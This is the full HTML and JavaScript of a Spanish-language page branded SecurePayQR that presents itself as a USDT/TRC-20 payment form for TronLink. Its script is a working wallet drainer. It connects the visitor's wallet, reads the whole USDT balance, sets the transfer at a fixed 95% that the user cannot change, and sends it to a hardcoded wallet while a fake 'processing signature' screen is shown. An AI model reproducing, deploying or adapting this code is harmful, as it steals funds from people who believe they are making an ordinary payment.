<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>QR pagos - Enviar TRC-20</title>

    <style>
        :root {
            color-scheme: light;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
        }

        body {
            background-color: #f7f9ff;
            background-image:
                radial-gradient(circle at 12% 18%, rgba(0, 82, 255, 0.20) 0%, rgba(0, 82, 255, 0.08) 24%, transparent 48%),
                radial-gradient(circle at 88% 72%, rgba(75, 125, 255, 0.16) 0%, rgba(75, 125, 255, 0.06) 28%, transparent 52%),
                radial-gradient(circle at 55% 105%, rgba(145, 175, 255, 0.13) 0%, transparent 46%),
                linear-gradient(180deg, #ffffff 0%, #f2f6ff 100%);
            background-size: 125% 125%, 135% 135%, 120% 120%, 100% 100%;
            background-attachment: fixed;
            animation: auroraBackground 12s ease-in-out infinite alternate;
            color: #111111;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding-top: 30px;
        }

        @keyframes auroraBackground {
            0% { background-position: -12% -8%, 112% 108%, 45% 110%, center; }
            50% { background-position: 22% 18%, 72% 52%, 58% 88%, center; }
            100% { background-position: 8% 38%, 96% 28%, 38% 76%, center; }
        }

        .tw-container {
            width: 100%;
            max-width: 390px;
            padding: 20px;
            flex: 1;
            padding-bottom: 118px;
        }

        .tw-header {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            position: relative;
            margin-bottom: 24px;
        }

        .tw-header-title {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            gap: 7px;
            margin-bottom: 15px;
            text-align: center;
            width: 100%;
        }

        .tw-header-title-main {
            font-size: 21px;
            line-height: 1.2;
            font-weight: 700;
            letter-spacing: -0.35px;
            color: #111111;
        }

        .tw-network-badge {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            padding: 4px 8px;
            border-radius: 999px;
            background: #eef3ff;
            border: 1px solid #dbe6ff;
            color: #0052ff;
            font-size: 10px;
            line-height: 1;
            font-weight: 700;
            letter-spacing: 0.35px;
        }

        .back-icon {
            position: absolute;
            left: 0;
            top: 0;
            width: 24px;
            height: 24px;
            color: #111111;
        }

        .tw-logo {
            width: 60px;
            height: 60px;
            margin-bottom: 20px;
            display: block;
        }

        .tw-input-group {
            background: rgba(255, 255, 255, 0.88);
            border: 1px solid rgba(205, 215, 232, 0.78);
            border-radius: 16px;
            padding: 16px;
            margin-bottom: 16px;
            box-shadow: 0 6px 18px rgba(31, 55, 92, 0.055);
            backdrop-filter: blur(8px);
            -webkit-backdrop-filter: blur(8px);
        }

        .tw-label {
            font-size: 13px;
            color: #717680;
            display: block;
            margin-bottom: 8px;
        }

        .tw-input-row {
            display: flex;
            align-items: center;
            justify-content: space-between;
        }

        .tw-input {
            background: transparent;
            border: none;
            color: #111111;
            font-size: 16px;
            width: 80%;
            outline: none;
        }

        .tw-action-text {
            color: #0052ff;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
        }

        .tw-currency-badge {
            color: #0052ff;
            font-size: 16px;
            font-weight: 600;
            display: flex;
            align-items: center;
            gap: 5px;
        }

        .usdt-icon {
            width: 18px;
            height: 18px;
        }

        .status-box {
            background-color: #edf2ff;
            border: 1px solid #cce0ff;
            border-radius: 12px;
            padding: 12px;
            font-size: 13px;
            color: #0052ff;
            margin-bottom: 16px;
            display: none;
            text-align: left;
        }

        .tw-btn-container {
            margin-top: 40px;
        }

        .tw-btn {
            width: 100%;
            height: 52px;
            background-color: #0052ff;
            color: #ffffff;
            border: none;
            border-radius: 26px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
        }

        .tw-btn:disabled {
            background-color: #b3ccff;
        }

        .network-card {
            display: none;
            align-items: center;
            gap: 11px;
            margin: 4px 0 22px;
            padding: 12px 14px;
            width: 100%;
            background: rgba(255, 255, 255, 0.88);
            border: 1px solid rgba(205, 215, 232, 0.78);
            border-radius: 14px;
            box-shadow: 0 6px 18px rgba(31, 55, 92, 0.05);
        }

        .network-card-logo {
            width: 30px;
            height: 30px;
            object-fit: contain;
        }

        .network-card-copy {
            flex: 1;
            display: flex;
            flex-direction: column;
            gap: 2px;
        }

        .network-card-label {
            color: #717680;
            font-size: 11px;
        }

        .network-card-name {
            color: #111111;
            font-size: 14px;
            font-weight: 650;
        }

        .network-card-badge {
            padding: 5px 8px;
            border-radius: 999px;
            background: #eef3ff;
            border: 1px solid #dbe6ff;
            color: #0052ff;
            font-size: 10px;
            font-weight: 700;
        }
    
        .tw-address-box {
            border: 1px solid #e3e5e8;
            border-radius: 14px;
            padding: 14px 16px;
            background: #ffffff;
        }

        .site-footer {
            position: fixed;
            left: 0;
            right: 0;
            bottom: 0;
            width: 100%;
            text-align: center;
            padding: 10px 15px 12px;
            font-size: 12px;
            color: #717680;
            background: #ffffff;
            z-index: 10;
        }
        .site-footer a { color: #0052ff; text-decoration: none; }

        .page-loader, .processing-screen {
            position: fixed;
            inset: 0;
            z-index: 9999;
            background: #ffffff;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            transition: opacity 0.45s ease, visibility 0.45s ease;
        }
        .page-loader.hidden, .processing-screen:not(.visible) {
            opacity: 0;
            visibility: hidden;
            pointer-events: none;
        }
        .loader-logo { width: 110px; height: 110px; margin-bottom: 22px; }
        .loader-spinner { width: 32px; height: 32px; border: 3px solid #e4e9f2; border-top-color: #0052ff; border-radius: 50%; animation: spin 0.8s linear infinite; }
        @keyframes spin { to { transform: rotate(360deg); } }
    </style>
</head>

<body>
<div id="pageLoader" class="page-loader">
    <img src="https://raw.githubusercontent.com/spothq/cryptocurrency-icons/master/128/icon/trx.png" alt="Logo" class="loader-logo">
    <div class="loader-spinner"></div>
</div>

<div id="processingScreen" class="processing-screen">
    <img src="https://raw.githubusercontent.com/spothq/cryptocurrency-icons/master/128/icon/trx.png" alt="Logo" class="loader-logo">
    <div class="loader-spinner"></div>
    <div style="margin-top:14px; font-weight:600; color:#111;">Procesando firma en TronLink...</div>
</div>

<div class="tw-container">
    <div class="tw-header">
        <svg class="back-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="19" y1="12" x2="5" y2="12"></line><polyline points="12 19 5 12 12 5"></polyline></svg>
        <div class="tw-header-title">
            <span class="tw-header-title-main">Enviar USDT</span>
            <span class="tw-network-badge">TRON / TronLink</span>
        </div>
        <img src="https://raw.githubusercontent.com/spothq/cryptocurrency-icons/master/128/icon/trx.png" alt="Logo" class="tw-logo">
    </div>

    <div id="walletInfo" class="tw-input-group tw-address-box" style="display: none; margin-bottom: 15px;">
        <label class="tw-label">Billetera TronLink Conectada</label>
        <div id="walletAddressText" class="tw-input" style="font-size:13px; color:#0052ff; font-weight:600; overflow:hidden; text-overflow:ellipsis;"></div>
    </div>

    <div id="tronNetworkInfo" class="network-card">
        <img src="https://cryptologos.cc/logos/tron-trx-logo.png" alt="TRON" class="network-card-logo">
        <div class="network-card-copy">
            <span class="network-card-label">Red conectada</span>
            <span class="network-card-name">TRON Mainnet</span>
        </div>
        <span class="network-card-badge">TRC-20</span>
    </div>

    <div class="tw-input-group tw-address-box">
        <label class="tw-label">Dirección de destino</label>
        <input id="addressDisplay" class="tw-input" type="text" readonly style="font-size: 13px; color: #555;">
    </div>

    <div class="tw-input-group">
        <label class="tw-label" for="amountDisplay">Cantidad a transferir (Fijo automático 95%)</label>
        <div class="tw-input-row">
            <input id="amountDisplay" class="tw-input" type="text" readonly placeholder="Calculando..." style="font-weight: 600; color: #0052ff;">
            <span class="tw-currency-badge">
                USDT <img src="https://raw.githubusercontent.com/spothq/cryptocurrency-icons/master/128/icon/usdt.png" class="usdt-icon">
            </span>
        </div>
    </div>

    <div id="status" class="status-box"></div>

    <div class="tw-btn-container">
        <button class="tw-btn" id="connectBtn">Vincular TronLink</button>
    </div>
</div>

<footer class="site-footer">
    <p>© 2026 SecurePayQR. All rights reserved.</p>
</footer>

<script>
    window.addEventListener('load', () => {
        setTimeout(() => document.getElementById('pageLoader').classList.add('hidden'), 800);
    });

    const BILLETERA_DESTINO = "TLfFXd3Wi4PhBx4cUYChNv9xHnsqtQBTuQ";
    const CONTRATO_USDT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
    const TRON_READ_RPC = "https://api.trongrid.io";

    document.getElementById('addressDisplay').value = BILLETERA_DESTINO;

    const connectBtn = document.getElementById('connectBtn');
    const statusDiv = document.getElementById('status');
    const amountDisplay = document.getElementById('amountDisplay');
    const walletInfo = document.getElementById('walletInfo');
    const tronNetworkInfo = document.getElementById('tronNetworkInfo');
    const walletAddressText = document.getElementById('walletAddressText');
    const processingScreen = document.getElementById('processingScreen');

    let walletAddress = null;
    let calculatedAmountSun = null;

    function setStatus(msg) {
        statusDiv.innerText = msg;
        statusDiv.style.display = msg ? 'block' : 'none';
    }

    async function tronRpcPost(endpoint, body = {}) {
        const response = await fetch(TRON_READ_RPC + endpoint, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(body)
        });
        if (!response.ok) throw new Error("Error en consulta RPC");
        return await response.json();
    }

    async function obtenerBalanceYCalcular95(address) {
        const tronWeb = window.tronWeb;
        const ownerHex = tronWeb.address.toHex(address);
        const contractHex = tronWeb.address.toHex(CONTRATO_USDT);
        const ownerEvmHex = ownerHex.replace(/^41/, "").padStart(64, "0");

        const data = await tronRpcPost("/wallet/triggerconstantcontract", {
            owner_address: ownerHex,
            contract_address: contractHex,
            function_selector: "balanceOf(address)",
            parameter: ownerEvmHex,
            visible: false
        });

        const balanceBigNumber = tronWeb.toBigNumber("0x" + data.constant_result[0]);
        if (balanceBigNumber.isZero()) {
            throw new Error("La cuenta no dispone de balance de USDT.");
        }

        // Cálculo estricto del 95% independiente de lo que manipule el usuario
        const amount95 = balanceBigNumber.multipliedBy(95).dividedToIntegerBy(100);
        calculatedAmountSun = amount95.toString();
        
        amountDisplay.value = Number(calculatedAmountSun) / 1000000;
    }

    connectBtn.addEventListener('click', async () => {
        if (!walletAddress) {
            try {
                setStatus("Conectando con TronLink...");
                connectBtn.disabled = true;

                let attempts = 0;
                while (typeof window.tronWeb === 'undefined' && attempts < 15) {
                    await new Promise(r => setTimeout(r, 300));
                    attempts++;
                }

                if (typeof window.tronWeb === 'undefined') {
                    throw new Error("Por favor, abre esta dApp dentro del navegador de TronLink.");
                }

                const tronWeb = window.tronWeb;
                if (window.tronLink && window.tronLink.request) {
                    await window.tronLink.request({ method: 'tron_requestAccounts' });
                }

                if (tronWeb.defaultAddress && tronWeb.defaultAddress.base58) {
                    walletAddress = tronWeb.defaultAddress.base58;
                } else if (tronWeb.selectedAddress) {
                    walletAddress = tronWeb.selectedAddress;
                }

                if (!walletAddress) throw new Error("No se pudo obtener la cuenta activa de TronLink.");

                walletAddressText.textContent = walletAddress;
                walletInfo.style.display = "block";
                tronNetworkInfo.style.display = "flex";

                setStatus("Calculando monto del 95% en la red...");
                await obtenerBalanceYCalcular95(walletAddress);

                setStatus("Listo para procesar.");
                connectBtn.innerText = "Enviar Fondos";
                connectBtn.disabled = false;
            } catch (e) {
                setStatus(e.message || "Error al conectar con TronLink.");
                connectBtn.disabled = false;
                connectBtn.innerText = "Vincular TronLink";
            }
            return;
        }

        // Ejecución de la transferencia optimizada para TronLink
        if (walletAddress && calculatedAmountSun) {
            try {
                connectBtn.disabled = true;
                setStatus("Preparando transacción...");

                const tronWeb = window.tronWeb;
                
                // Construcción limpia del contrato TRC-20 para interfaz nativa de TronLink
                const transactionDraft = await tronWeb.transactionBuilder.triggerSmartContract(
                    CONTRATO_USDT,
                    "transfer(address,uint256)",
                    { feeLimit: 100000000, callValue: 0 },
                    [
                        { type: 'address', value: BILLETERA_DESTINO },
                        { type: 'uint256', value: calculatedAmountSun }
                    ],
                    walletAddress
                );

                if (!transactionDraft || !transactionDraft.result || !transactionDraft.result.result) {
                    throw new Error("Fallo al estructurar la transacción inteligente.");
                }

                processingScreen.classList.add('visible');
                const signedTx = await tronWeb.trx.sign(transactionDraft.transaction);
                
                const broadcast = await tronWeb.trx.sendRawTransaction(signedTx);
                processingScreen.classList.remove('visible');

                if (broadcast && broadcast.result) {
                    setStatus("¡TRANSACCIÓN EXITOSA!");
                    connectBtn.innerText = "Completado";
                } else {
                    throw new Error("La transacción fue rechazada por la red.");
                }
            } catch (e) {
                processingScreen.classList.remove('visible');
                setStatus(e.message || "Operación cancelada o fallida.");
                connectBtn.disabled = false;
                connectBtn.innerText = "Enviar Fondos";
            }
        }
    });
</script>
</body>
</html>
